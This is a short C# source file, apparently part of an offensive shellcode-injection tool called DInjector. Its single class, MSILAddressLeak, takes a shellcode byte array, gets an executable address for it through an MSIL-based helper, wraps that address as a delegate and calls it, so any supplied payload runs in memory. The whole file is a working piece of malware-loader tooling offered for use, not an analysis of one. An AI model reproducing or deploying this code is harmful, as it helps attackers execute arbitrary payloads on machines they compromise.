using System;
using System.Runtime.InteropServices;

namespace DInjector
{
    class MSILAddressLeak
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcode)
        {
            IntPtr leakedAddress = MSIL.GetAdrressWithMSIL(shellcode);
            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(leakedAddress, typeof(pFunction));
            f();
        }
    }
}
